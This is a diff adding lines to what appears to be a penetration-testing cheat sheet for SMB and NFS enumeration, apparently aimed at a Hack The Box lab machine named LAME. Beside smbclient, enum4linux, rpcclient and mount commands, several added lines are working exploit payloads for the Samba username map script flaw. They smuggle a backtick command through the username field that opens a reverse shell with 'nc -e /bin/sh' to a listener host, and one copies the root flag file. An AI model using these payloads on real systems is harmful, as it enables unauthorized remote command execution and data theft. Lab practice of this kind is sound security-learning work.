@@ -1,3 +1,29 @@
 smbmap -H "10.10.185.43" | tee "recon/smbmap_10.10.185.43.txt"      
 smbclient -L "//10.10.185.43/" -U "guest"%| tee "recon/smbclient_10.10.185.43.txt"              
 
+smbclient -L x.x.x.x
+smbmount //x.x.x.x/share /mnt –o username=hodor,workgroup=hodor
+smbclient \\\\x.x.x.x\\share
+enum4linux -a ip
+rpcclient -U "" x.x.x.x  #Anonymous bind using rpcclient / Null connect
+smbclient //MOUNT/share #Connect to SMB share
+
+smbclient -U "/=&#92;&#96;nohup nc -e /bin/sh LHOST LPORT&#92;&#96;" -N -I ip //LAME/tmp
+
+nmap -T4 -sS -sC -Pn -A --script smb-vuln* ip
+smbclient //ip/tmp
+logon "./=`nohup nc -e /bin/sh LHOST LPORT`"
+
+smbclient -U "/=\`nohup cat /root/root.txt > /tmp/ttt\`" -N -I ip //LAME/tmp
+
+smbclient -U "/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`" -N -I ip //LAME/tmp
+
+smbclient -L ip
+enum4linux -S ip
+mount ip:/vol/share /mnt/nfs  -nolock
+mount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifs
+mount -t cifs //x.x.x.x/share /mnt
+mount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mnt
+Mounting File Share
+showmount -e IPADDR
+sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
